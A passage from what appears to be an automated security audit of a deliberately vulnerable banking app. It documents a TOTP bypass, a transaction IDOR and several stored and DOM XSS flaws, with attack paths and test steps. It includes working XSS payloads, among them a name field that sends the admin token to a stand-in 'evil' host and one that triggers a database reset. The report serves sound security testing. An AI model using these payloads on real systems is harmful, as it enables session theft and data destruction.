  "operation": "TOTP required path continues without verification"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/transfers/external with transfer_type manual (to_bsb/to_account_number) or first-time address_book_id",
    "TransferService::checkTotpRequired returns required=true for manual and unverified payees",
    "If user.totp_enabled is false, the code allows the transfer to proceed with totpVerified=false",
    "If totp_enabled is true but totp_code is omitted/empty, the elseif (!empty($totpCode)) branch is skipped and the transfer still succeeds",
    "Account::updateBalance and Transaction::create commit the payment without a verified second factor"
  ],
  "impact": "Step-up 2FA on high-risk external payments is skippable: stolen or forged sessions can send funds to a new payee without TOTP.",
  "severity_reasoning": "High: the intended control for first-time/manual external transfers does not fail closed. Attackers with session theft (or unsigned JWTs) bypass 2FA on money movement.",
  "dynamic_test": "Using a user with totp_enabled=0, POST /api/transfers/external manual payee with no totp_code — expect 201 totp_verified=false. Using a user with totp_enabled=1, omit totp_code entirely (do not send empty-invalid) and confirm the transfer still 201 rather than TOTP_INVALID. Sending a wrong non-empty code should 403, proving only the omit path is bypassed."
}
```

#### Validator reasoning

Confirmed. POST /api/transfers/external is authenticated and reachable (Router.php maps it to TransactionController::transferExternal). totp_code is not in the validator rules and is forwarded as `$data['totp_code'] ?? null`. TransferService::checkTotpRequired correctly marks manual transfers and first-time (unverified) address-book payees as TOTP-required, but the subsequent gate is incomplete: if the user has TOTP disabled the transfer is allowed; if TOTP is enabled and totp_code is omitted or empty, the `elseif (!empty($totpCode))` branch is skipped, `$totpVerified` stays false, and execution continues into Account::updateBalance plus Transaction::create(status=completed). totp_verified is only persisted as a flag and used later to mark an address-book entry verified; it never aborts the debit. Login does not demand TOTP either, so a stolen password or session can send funds to a new payee without 2FA. Frontend transfers.js only prompts for a 6-digit code and is not a server-side control.

#### Code evidence

```
// VULNERABILITY #8: TOTP Bypass — if TOTP is required but not configured, transfer proceeds anyway.
// Additionally, if configured but code is omitted, transfer still succeeds.
if ($totpCheck['required']) {
    if (!$user['totp_enabled']) {
        // Allow transfer to proceed without TOTP if user hasn't configured it
        $totpVerified = false;
    } elseif (!empty($totpCode)) {
        if (!TotpService::verify($user['totp_secret'], $totpCode, $user['email'])) {
            Response::forbidden('TOTP_INVALID', 'Invalid TOTP code. Please try again.');
        }
        $totpVerified = true;
    }
}
```

## 24. GET /api/transactions/{id} returns any customer's transaction

- Lead reference: ENCX-024
- Category: API1
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:41
- Fingerprint: 4646aeae1acd56cd72a48c671b5cc302a1a490dc4386b0216d5c0e1539f92a54

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 41,
  "symbol": "show",
  "input": "path parameter id"
}
```

#### Controls encountered

```
[
  "Route requires AuthMiddleware (any valid JWT)",
  "Numeric id path constraint {id:\\d+}"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 11,
  "symbol": "findById",
  "operation": "SELECT * FROM transactions WHERE id = ?"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Any customer JWT (including unsigned forged token) → GET /api/transactions/{id}",
    "TransactionController::show calls Transaction::findById((int)vars['id']) with no Account::findByIdAndUser / user_id join",
    "Transaction::format serializes from_account_id, destination BSB/account, amount, description, FX fields",
    "Response::success returns the foreign record; index() is correctly scoped, show() is not"
  ],
  "impact": "Enumerate transaction ids to read other customers' payment amounts, account numbers, BSBs, and descriptions.",
  "severity_reasoning": "High (as classified): full cross-tenant read of payment records via a simple primary-key GET, reachable without a real password because JWTs are unsigned.",
  "dynamic_test": "Forge or login as user 10. Walk GET /api/transactions/1, /2, /3. Confirm records whose from_account_id is not owned by user 10 still return 200 with to_bsb/to_account_number/amount. A 404 for foreign ids would mean an ownership check was added."
}
```

#### Validator reasoning

GET /api/transactions/{id} is a concrete BOLA/IDOR. Router.php registers the route with AuthMiddleware only (authentication, not object-level authorization). TransactionController::show receives $auth but never reads it; it casts the path id and loads via Transaction::findById, which is an unscoped SELECT * FROM transactions WHERE id = ?. On hit it returns Transaction::format($txn), exposing from_account_id, destination BSB/account number, amount, description, receipt_number, and FX fields. Sibling resources (AccountController::show, AddressBookController::show) and this controller's own index() correctly use findByIdAndUser / findByUser, so the missing ownership check is an implementation gap, not an intended public lookup. Transaction ids are AUTO_INCREMENT integers and the route constraint is {id:\d+}, so any authenticated user (public /api/auth/register or seeded customers) can enumerate other customers' payment history. No subsequent ownership comparison of from_account_id/to_account_id against the caller exists.

#### Code evidence

```
public static function show(array $auth, array $vars): void
{
    $txn = Transaction::findById((int)$vars['id']);

    if (!$txn) {
        Response::notFound('Transaction not found.');
    }

    Response::success(Transaction::format($txn));
}
```

## 25. Stored XSS in admin customer Delete handler via HTML-entity decoding

- Lead reference: ENCX-025
- Category: A03
- Severity: MEDIUM
- Confidence: 92%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/customers.js:107
- Fingerprint: a7ed12dab11a3d6808aa4794ade7a5338ef34b9cb7978b9bd1503e039feb5204

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 31,
  "symbol": "User::create",
  "input": "first_name/last_name from POST /api/auth/register JSON body"
}
```

#### Controls encountered

```
[
  "BankOfEdAdmin.Utils.escapeHtml encodes <>&\"' to HTML entities — wrong context for a JS string inside an event-handler attribute",
  "replace(/'/g, \"\\\\'\") runs after escapeHtml so it never observes a raw quote",
  "X-XSS-Protection: 1; mode=block in deploy.sh is reflected-XSS only and is ignored by modern browsers",
  "No Content-Security-Policy on the admin SPA"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/customers.js",
  "line": 107,
  "symbol": "confirmDelete onclick / innerHTML",
  "operation": "HTML output into JS string context"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Exploitation requires an administrator to open the attacker customer record and click Delete (plausible, but not a page-load XSS)",
  "The example full-database-reset payload in the original evidence exceeds a single 100-char name field; token theft or a split first_name+last_name payload still fits"
]
```

#### Attack path

```
{
  "nodes": [
    "Unauthenticated attacker POST /api/auth/register (or PUT /api/profile) with first_name/last_name containing a JS string-break payload (required|string|max:100, no quote sanitization)",
    "User::create/update stores the raw names in VARCHAR(100)",
    "Admin GET /api/admin/customers/{id} returns names via json_encode (apostrophes intact)",
    "Admin SPA customers.js renderDetail interpolates the name into a single-quoted onclick after U.escapeHtml + replace(/'/g)",
    "innerHTML assignment; HTML parser decodes &#39; back to ' inside the event-handler JS",
    "Administrator clicks Delete; attacker script runs in the admin origin and can read bankofed_admin_token"
  ],
  "impact": "Stored XSS in the admin customer-detail Delete handler: clicking Delete executes attacker JS with the administrator's origin, enabling token theft and privileged admin APIs (password reset, balances, FX, database wipe).",
  "severity_reasoning": "Registration is public and names are unconstrained except length. The intended JS-string escape never sees a raw quote because escapeHtml already turned it into &#39;. Exploitation requires an admin to open the planted customer and click Delete (realistic stored-XSS interaction). Medium because it is click-gated rather than page-load XSS, but admin impact is severe.",
  "dynamic_test": "Register with last_name `');alert(document.domain);//`. As admin, open #/customers/{id} and inspect the Delete button onclick (should contain &#39; that decodes to a quote). Click Delete and confirm attacker JS runs (alert or a fetch of localStorage.bankofed_admin_token). Keep payload under 100 characters."
}
```

#### Validator reasoning

Concrete stored-XSS path with no effective control.

Source: public POST /api/auth/register (Router.php, auth => false) accepts first_name/last_name as required|string|max:100. Validator::validateString only checks is_string; there is no regex, charset, or quote stripping. User::create stores the raw values in VARCHAR(100) columns. Authenticated PUT /api/profile can also overwrite them.

Sink: AdminUserController::show returns those raw names. customers.js renderDetail builds an inline handler:

button onclick="...confirmDelete(" + c.id + ", '" + U.escapeHtml(first+' '+last).replace(/'/g, "\\'") + "')"

and assigns it with U.$('customer-detail-content').innerHTML = html (line 162).

escapeHtml maps ' to &#39;, so the subsequent replace(/'/g) never sees a quote. The HTML parser then decodes &#39; back to ' inside the double-quoted attribute before compiling the event handler. Payload last_name=');alert(document.domain);// yields handler source confirmDelete(ID, '');alert(document.domain);//') which executes on click.

Blocking controls are ineffective: HTML-escaping is the wrong encoding for a JS string inside an event-handler attribute; X-XSS-Protection in deploy.sh does not apply to stored XSS; admin/index.html has no CSP. Admin token lives in localStorage (bankofed_admin_token), so the same-origin handler can call /api/admin/* (password reset, balances, FX, POST /api/admin/system/reset).

User interaction (admin opens the customer and clicks Delete) is required but is a realistic admin action, not a blocking control. A 100-char field is enough for token theft; first+last together give 201 chars.

#### Code evidence

```
Admin render (customers.js):
button onclick="BankOfEdAdmin.CustomersPage.confirmDelete(' + c.id + ', \'' + U.escapeHtml(c.first_name + ' ' + c.last_name).replace(/'/g, "\\'") + '\')"

escapeHtml maps ' to &#39;, so replace(/'/g) never sees a raw quote. The HTML parser then decodes &#39; back to ' before executing onclick.

Customer source (AuthController::register / ProfileController::update) accepts first_name/last_name as unconstrained strings (max 100), e.g. last_name = "');fetch('/api/admin/system/reset',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('bankofed_admin_token')},body:'{\"confirm\":\"RESET\"}'});//"
```

## 26. Stored XSS in admin accounts table via account_name onclick

- Lead reference: ENCX-026
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/accounts.js:54
- Fingerprint: 801e0312ada858ae6a1d3b524ea70977d074e3956211beb451f76b0f2177c0cb

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AccountController.php",
  "line": 28,
  "symbol": "account_name",
  "input": "JSON body account_name on POST /api/accounts"
}
```

#### Controls encountered

```
[
  "U.escapeHtml (HTML-entity encoding only; wrong context for a JS string inside an event-handler attribute)",
  "post-escape replace(/'/g, \"\\\\'\") which never sees quotes because they are already &#39;",
  "Validator required|string|max:100 (allows quotes, parentheses, semicolons, and JS metacharacters)",
  "PDO prepared INSERT (stores the name verbatim; not an output-encoding control)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/accounts.js",
  "line": 54,
  "symbol": "container.innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker registers (public) then POST /api/accounts with account_name containing a single-quote JS breakout (required|string|max:100, no HTML/JS sanitization)",
    "Account::create persists the raw name",
    "Admin GET /api/admin/accounts returns newest accounts first with account_name intact",
    "admin/js/pages/accounts.js renderTable builds onclick showEditBalanceModal(..., '<escaped name>', ...) then container.innerHTML = html",
    "escapeHtml maps ' to &#39; so replace(/'/g) is a no-op; HTML attribute decoding restores the quote",
    "Admin clicks Edit Balance; attacker script runs in the admin origin and can steal bankofed_admin_token"
  ],
  "impact": "Stored XSS on the admin accounts table: clicking Edit Balance executes attacker-controlled script in the administrator origin, enabling theft of the admin Bearer token and calls to setBalance, resetPassword, deleteCustomer, and export.",
  "severity_reasoning": "The malicious row is ordered onto page 1 (ORDER BY id DESC) so the victim admin is likely to see it. No CSP. Same encoding defect as the customer Delete handler but on a high-traffic admin list. High because a single click on a first-page action yields full admin API access.",
  "dynamic_test": "As a customer, POST /api/accounts with account_name `');alert(document.domain)//`. As admin, GET /api/admin/accounts or open #/accounts, confirm the new row is first, click Edit Balance, and observe JS execution / token exfil from localStorage.bankofed_admin_token."
}
```

#### Validator reasoning

Confirmed stored XSS with a complete source-to-sink path and no effective blocking control.

Source: an authenticated customer (registration is public via POST /api/auth/register) creates an account via POST /api/accounts. AccountController::store validates account_name only as required|string|max:100; Validator has no regex/HTML/JS sanitization. Account::create persists the raw value with a prepared INSERT. The banking UI also posts the form field as-is (maxlength=100, no charset filter).

Propagation: AdminAccountController::index selects a.account_name and returns it through json_encode with no JSON_HEX_APOS. Newest accounts are listed first (ORDER BY a.id DESC), so a freshly planted payload appears on page 1 of GET /api/admin/accounts.

Sink: public/admin/js/pages/accounts.js renderTable builds:
  onclick="BankOfEdAdmin.AccountsPage.showEditBalanceModal(" + a.id + ", '" + U.escapeHtml(a.account_name).replace(/'/g, "\\'") + "', '" + a.balance + "')"
then assigns the markup with container.innerHTML.

Why the intended controls fail: escapeHtml maps ' to &#39; (HTML context). The subsequent replace(/'/g, "\\'") therefore never observes a raw quote. innerHTML attribute parsing HTML-decodes &#39; back to ' before the event handler source is compiled. Payload `');alert(document.domain)//` (well under 100 chars) becomes:
  showEditBalanceModal(ID, '');alert(document.domain)//', '0.00')
when the admin clicks Edit Balance.

No CSP / Trusted Types / sanitizer exists (admin/index.html, .htaccess, PHP Response/CorsMiddleware). Token is in localStorage as bankofed_admin_token and is readable from this origin; the same page's Api client can call privileged admin endpoints (setBalance, resetPassword, deleteCustomer, export users). Click is required, but that is normal for stored XSS in an inline handler and is realistic because the malicious row is on page 1.

#### Code evidence

```
accounts.forEach(function (a) {
  ...
  html += ...
    '<button onclick="BankOfEdAdmin.AccountsPage.showEditBalanceModal(' + a.id + ', \'' + U.escapeHtml(a.account_name).replace(/'/g, "\\'") + '\', \'' + a.balance + '\')" ...'
  ...
});
container.innerHTML = html;

// source: AccountController::store accepts unsanitized account_name
'account_name' => 'required|string|max:100',
...
'account_name'   => $data['account_name'],
```

## 27. Stored XSS in admin customer detail via name in Delete onclick

- Lead reference: ENCX-027
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/customers.js:161
- Fingerprint: 78d7691526de12c2b89bc96084c54bb160225b22e69c4aeb6c7e58dbbdea80e8

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 19,
  "symbol": "first_name/last_name",
  "input": "JSON body first_name and last_name on POST /api/auth/register"
}
```

#### Controls encountered

```
[
  "U.escapeHtml (HTML context only: ' -> &#39;) applied before JS-string escaping",
  "post-escape replace(/'/g, \"\\\\'\") never matches entity-encoded quotes",
  "integer customer id in the first confirmDelete argument (does not protect the name argument)",
  "registration max:100 / VARCHAR(100) (too large to block a token-theft payload)",
  "no CSP / no HTML sanitizer on innerHTML"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/customers.js",
  "line": 161,
  "symbol": "innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Anyone POST /api/auth/register with last_name or first_name containing ' (required|string|max:100)",
    "User::create stores names verbatim",
    "Admin GET /api/admin/customers/{id} returns unsanitized names",
    "CustomersPage.showDetail -> renderDetail concatenates first+last into confirmDelete onclick, HTML-escapes, then innerHTML at customers.js:161",
    "Browser HTML-decodes &#39; to ' before compiling the event handler",
    "Admin clicks Delete; attacker JS in admin origin steals bankofed_admin_token and invokes /api/admin/*"
  ],
  "impact": "Unauthenticated stored XSS: a planted customer name executes in the admin origin when Delete is clicked, yielding admin session theft and privileged banking-admin operations.",
  "severity_reasoning": "Source is fully unauthenticated registration. Sink is innerHTML of an inline JS handler with the wrong encoding. No CSP. Distinct from list-page XSS because this fires on the customer-detail view. High impact due to public source and admin-origin execution.",
  "dynamic_test": "POST /api/auth/register with last_name `');fetch('https://evil/?t='+localStorage.getItem('bankofed_admin_token'));//`. As admin open #/customers/{id}, click Delete, and confirm the fetch/exfil fires with the admin token."
}
```

#### Validator reasoning

Public registration stores attacker-controlled first_name/last_name with only required|string|max:100, then the admin customer-detail view interpolates those names into a JS string inside an onclick attribute using HTML escaping (wrong context) and writes the markup with innerHTML. That is a concrete stored XSS path in the admin origin.

Source: POST /api/auth/register (Router.php, auth => false) accepts first_name/last_name. Validator::validateString only checks is_string; max:100 matches the VARCHAR(100) columns. User::create binds the raw values. AdminDatabase and Database share DB_NAME (bankofed), so AdminUserController::show returns the same unsanitized names via json_encode (single quotes are not JSON-special).

Sink: CustomersPage.showDetail (#/customers/:id) calls renderDetail, which builds:
onclick="...confirmDelete(" + c.id + ", '" + U.escapeHtml(name).replace(/'/g, "\\'") + "')"
and assigns it at customers.js:161 via U.$('customer-detail-content').innerHTML.

escapeHtml maps ' to &#39;. The subsequent replace(/'/g, "\\'") therefore never sees a raw apostrophe. innerHTML HTML-decodes &#39; back to ' before the attribute is treated as JavaScript. Payload last_name `');fetch('https://evil/?t='+localStorage.getItem('bankofed_admin_token'));//` becomes confirmDelete(id, 'Attacker ');fetch(...);//') and runs when an admin clicks Delete. No CSP, no DOMPurify/Trusted Types. Admin token lives in localStorage (bankofed_admin_token), so the script can steal it and call /api/admin/* on the same origin. Clicking Delete is a realistic admin action on a planted account; confirmDelete still runs, then the injected statement executes.

#### Code evidence

```
'<button onclick="BankOfEdAdmin.CustomersPage.confirmDelete(' + c.id + ', \'' + U.escapeHtml(c.first_name + ' ' + c.last_name).replace(/'/g, "\\'") + '\')" class="text-sm font-medium text-red-600 ...">Delete</button>'
...
U.$('customer-detail-content').innerHTML = html;

// source: AuthController::register
'first_name' => 'required|string|max:100',
'last_name'  => 'required|string|max:100',
...
'first_name'    => $data['first_name'],
'last_name'     => $data['last_name'],
```

## 28. DOM XSS via unsanitized avatar_data in sidebar innerHTML

- Lead reference: ENCX-028
- Category: A03
- Severity: MEDIUM
- Confidence: 86%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/app.js:72
- Fingerprint: dfd9bbb92f042fc41b1062ee3bb91fd9723641652c18a29193301afad68ba1c1

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 101,
  "symbol": "avatar_data",
  "input": "Remote Content-Type header from user-supplied avatar URL"
}
```

#### Controls encountered

```
[
  "POST /api/profile/avatar requires a Bearer session (AuthMiddleware)",
  "BankOfEd.Utils.escapeHtml exists but is not applied on app.js:72 or profile.js renderAvatar",
  "json_encode on the API response only JSON-escapes quotes; they are restored after JSON.parse and still break the HTML attribute",
  "No Content-Security-Policy on public/banking/index.html or public/.htaccess"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/app.js",
  "line": 72,
  "symbol": "avatarEl.innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

```
[
  "Auth is Authorization: Bearer from localStorage, not cookies, so a third-party site cannot CSRF the import without the token",
  "avatarProxy always writes avatar_url for $auth['user']['id']; ProfileController::update does not include avatar_url in its allowed fields, so one customer cannot plant this on another account",
  "After logout, clearUser() drops localStorage avatar_data; post-login XSS requires visiting /profile (loadAvatar) or leftover localStorage from the same browser session"
]
```

#### Proof gaps

```
[
  "Exploit requires the victim (or a previously stored avatar_url) to import an attacker-controlled URL that returns a Content-Type containing a double-quote / event-handler breakout",
  "Remote fetch depends on PHP allow_url_fopen / HTTP wrappers; the feature is clearly designed to fetch remote URLs, but a locked-down php.ini would make the source fail closed"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated victim (or attacker with the victim JWT) POST /api/profile/avatar with url pointing at an attacker host",
    "ProfileController::avatarProxy file_get_contents the URL with no allowlist and copies remote Content-Type into avatar_data data:{mime};base64,...",
    "Response::success json_encodes; JSON.parse restores quotes in the MIME",
    "ProfilePage.renderAvatar writes avatar_data into localStorage bankofed_user; App.updateSidebar does avatarEl.innerHTML = '<img src=\"' + user.avatar_data + '\">' without escapeHtml",
    "Crafted Content-Type image/png\" onerror=\"... breaks the src attribute and runs onerror in the banking origin",
    "Payload re-renders on every SPA load via updateSidebar until logout"
  ],
  "impact": "Persistent DOM XSS in the authenticated banking origin that can steal localStorage bankofed_token (and a sibling sink in profile.js .html()).",
  "severity_reasoning": "Complete source-to-sink with no CSP or MIME allowlist. Impact is medium because it is account-scoped (avatarProxy always writes the caller's user_id; victim must import the attacker URL) rather than cross-user stored XSS. Bearer tokens block classic CSRF of the import.",
  "dynamic_test": "Host a resource whose Content-Type is `image/png\\\" onerror=\\\"alert(localStorage.getItem('bankofed_token'))\\\" x=\\\"`. POST /api/profile/avatar with that URL, then load the banking SPA and confirm the sidebar img onerror fires and the payload persists in localStorage bankofed_user. Also check profile.js avatar-preview .html()."
}
```

#### Validator reasoning

Confirmed stored DOM XSS with a complete source-to-sink path and no effective blocking control.

Source: POST /api/profile/avatar (auth required) accepts a client URL, fetches it with file_get_contents, and copies the remote Content-Type into avatar_data as data:{$mime};base64,... with no MIME allowlist or character filtering (ProfileController::avatarProxy). The URL is also persisted as users.avatar_url.

Transport: Response::success json_encodes without JSON_HEX_QUOT/JSON_HEX_TAG, so a quote in the MIME survives JSON.parse as a literal ".

Sink: BankOfEd.App.updateSidebar concatenates user.avatar_data into avatarEl.innerHTML without BankOfEd.Utils.escapeHtml. ProfilePage.renderAvatar does the same via jQuery .html() for both avatar_data and source_url. There is no CSP on the banking origin. innerHTML/jQuery .html() will run injected event handlers (onerror) even though they will not run <script> tags.

PoC shape: attacker hosts a resource whose Content-Type is image/png" onerror="alert(localStorage.getItem('bankofed_token'))" x=" so the sidebar becomes <img src="data:image/png" onerror="alert(...)" x=";base64,...">. The broken data: URI fails to load and fires onerror in the authenticated origin. renderAvatar then writes avatar_data into localStorage (bankofed_user), so updateSidebar re-executes on subsequent loads until logout; visiting /profile re-fetches the stored avatar_url and re-plants the payload.

Not a blocking control: authentication (this executes in the victim’s banking session), existence of unused escapeHtml, or JSON string escaping. CSRF is not required because the injection is in the fetched response, not a forged first-party form. Cross-user impact is limited: avatarProxy always updates $auth['user']['id'], and PUT /profile does not allow avatar_url, so this is account-scoped stored XSS (victim must import or already have the attacker URL). That is an exploit-condition, not a sanitizer.

#### Code evidence

```
Client sink (app.js):
  avatarEl.innerHTML = '<img src="' + user.avatar_data + '" alt="avatar" class="w-full h-full object-cover">';
  user comes from Api.getUser() → localStorage bankofed_user, populated by ProfilePage.renderAvatar after importAvatar.

Server construction (ProfileController::avatarProxy):
  $content = @file_get_contents($data['url'], ...);  // user-controlled URL, no allowlist
  $mime = trim(substr($header, 13));                 // attacker-controlled Content-Type
  'avatar_data' => "data:{$mime};base64,{$encoded}"

Sibling: public/banking/js/pages/profile.js renderAvatar() uses $('#avatar-preview').html('<img src="' + data.avatar_data + '" ...>') and interpolates data.source_url into .html() without escaping.
```

## 29. Stored XSS via unescaped transaction description on account detail

- Lead reference: ENCX-029
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:171
- Fingerprint: bad01a3f6acf62dd0b22b8f347d6489090c8f75ee955d54a89936c10d6b5cb74

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 74,
  "symbol": "description",
  "input": "JSON body description on POST /api/transfers/own and POST /api/transfers/external"
}
```

#### Controls encountered

```
[
  "Utils.escapeHtml exists and is applied to neighboring fields (account_name, BSB, tx.type, original_currency) but not tx.description",
  "Validator string|max:255 type/length check only; no HTML sanitization",
  "Account ownership check on GET /api/transactions?account_id= (findByIdAndUser) authorizes the viewer, does not encode description",
  "TOTP on some external transfers authenticates the sender and does not sanitize description",
  "No Content-Security-Policy in HTML, Apache, or PHP middleware"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Payload was not executed in a live browser; confirmation relies on the established DOM innerHTML event-handler behavior rather than a runtime PoC"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker POST /api/transfers/external (or /own) with description=<img src=x onerror=...> (string|max:255, no HTML sanitization)",
    "TransferService persists $description via Transaction::create; internal payee sets to_account_id on the victim account",
    "Victim GET /api/transactions?account_id=... (findByUser WHERE from OR to matches) returns the planted description raw",
    "accounts.js renderDetailTransactions concatenates tx.description into HTML and assigns container.innerHTML; adjacent tx.type uses escapeHtml",
    "No CSP; img onerror executes in the victim banking origin",
    "Script reads localStorage bankofed_token"
  ],
  "impact": "Cross-user stored XSS: a transfer description planted on a credited victim account executes when the victim opens account detail, stealing the banking session JWT.",
  "severity_reasoning": "Incoming transfers are included on account detail, so this is not self-XSS. Description is never encoded while neighboring fields are. Session token in localStorage and no CSP make token theft immediate. High for a banking SPA.",
  "dynamic_test": "As attacker, POST /api/transfers/external to a victim internal BSB/account with description `<img src=x onerror=\\\"alert(localStorage.bankofed_token)\\\">`. As the victim, open that account's detail page and confirm the onerror runs. Verify GET /api/transactions?account_id= includes the raw HTML description."
}
```

#### Validator reasoning

Confirmed stored XSS with a concrete cross-user source-to-sink path and no effective blocking control.

Source: POST /api/transfers/own and POST /api/transfers/external accept `description` under Validator rules `string|max:255` only (Validator.php does not strip or encode HTML). TransferService::transferOwn and transferExternal persist `$description` unchanged via Transaction::create. PaymentController::process/transfer also concatenate attacker-influenced merchant_name/payee_name/reference into the same column.

Persistence: transactions.description is VARCHAR(255); Transaction::format returns it raw; Response::success json_encode does not HTML-escape.

Cross-user reachability: transferExternal resolves the destination by BSB+account number and, when the payee is an internal Bank of Ed account, sets to_account_id and credits that account. GET /api/transactions?account_id=… uses Transaction::findByUser with `WHERE (t.from_account_id = ? OR t.to_account_id = ?)`, so a transfer sent TO the victim is returned on the victim’s account-detail view. Account ownership is checked (findByIdAndUser) before listing, which is authorization for viewing, not sanitization.

Sink: accounts.js renderDetailTransactions concatenates `(tx.description || '—')` into an HTML string and assigns it to container.innerHTML. Adjacent fields (tx.type, original_currency, account_name, BSB) are passed through Utils.escapeHtml, so the omission on description is specific, not a missing helper. innerHTML parses markup; `<script>` would not run, but event-handler payloads such as `<img src=x onerror=…>` execute in the banking origin.

Impact: public/banking/js/api.js stores the session JWT in localStorage.bankofed_token. No Content-Security-Policy is set in index.html, .htaccess, CorsMiddleware, Dockerfile, or docker-entrypoint.sh. A 255-character payload is sufficient to exfiltrate the token.

TOTP on external transfers authenticates the sender’s action and does not encode description; it is not a XSS control. Dashboard.js:91 has the same unescaped-description innerHTML pattern, but that list is loaded without account_id and therefore only outgoing rows (self-XSS / payment-API path), which does not weaken the account-detail cross-user sink.

#### Code evidence

````
Source (user-controlled description persisted verbatim):
TransactionController::transferOwn/transferExternal accept 'description' => 'string|max:255' and pass it to TransferService, which stores it via Transaction::create with no HTML encoding. PaymentController also concatenates merchant_name / payee_name / reference into description.

Sink (account detail, incoming transfers included):
BankOfEd-main/public/banking/js/pages/accounts.js renderDetailTransactions:
  html += '...<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>...'
  container.innerHTML = html;

loadTransactions() calls GET /api/transactions?account_id=... and Transaction::findByUser selects rows where from_account_id OR to_account_id matches, so a transfer sent TO the victim is rendered.

Token storage: BankOfEd-main/public/banking/js/api.js localStorage.setItem('bankofed_token', token)
No Content-Security-Policy headers anywhere in the repo.

Frontend sink (unescaped description → innerHTML):
```
txns.forEach(function (tx) {
  ...
  html +=
    '<tr class="tx-row border-b border-slate-50">' +
      '<td ...>' + U.formatDate(tx.created_at) + '</td>' +
      '<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>' +
      '<td ...>' + U.escapeHtml(tx.type) + '</span></td>' +
      ...
});
html += '</tbody></table></div>';
container.innerHTML = html;
```

Source: POST /api/transfers/own and /api/transfers/external accept description with only `string|max:255` (no HTML sanitization). TransferService::transferOwn/transferExternal persist `$description` unchanged. Transaction::format returns it raw. Internal transfers set `to_account_id`, so the recipient’s GET /api/transactions?account_id=… includes the sender’s description.

PaymentController also builds `description` as `'Payment to ' . $payeeName . ' (' . $reference . ')'` from machine-auth input and stores it in the same column.
````

## 30. Stored XSS via unescaped transaction description on dashboard

- Lead reference: ENCX-030
- Category: A03
- Severity: MEDIUM
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/dashboard.js:98
- Fingerprint: 772c738b72b50951f3cca0f4eb4e09f77409291469ad088e10e77e85c2b86921

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 54,
  "symbol": "transferOwn",
  "input": "description"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/dashboard.js",
  "line": 98,
  "symbol": "container.innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

```
[
  "Dashboard GET /api/transactions without account_id joins only from_account_id (Transaction::findByUser), so an incoming transfer planted on to_account_id is NOT rendered on the dashboard. Path (1) in the candidate writeup is therefore wrong for this sink; incoming XSS instead hits accounts.js:164 (findByAccount includes both from and to). Cross-user execution on dashboard.js itself requires the transferExternal source-account IDOR (or a machine-auth payment that debits the victim)."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker POST /api/transfers/external with from_account_id=<victim account> (Account::findById, no ownership) and description=<img onerror=...>",
    "Alternatively PaymentController composes description from unsanitized payee_name/reference under machine auth",
    "Transaction::create stores description; from_account_id is the victim so GET /api/transactions (no account_id) joins it for the victim",
    "dashboard.js renderTransactions concatenates tx.description into innerHTML without U.escapeHtml",
    "Victim opens banking dashboard; payload executes in origin and can steal bankofed_token"
  ],
  "impact": "Stored XSS on the dashboard recent-transactions list. Cross-user via the external-transfer source-account IDOR (or machine-auth payments), enabling theft of the victim's Bearer token.",
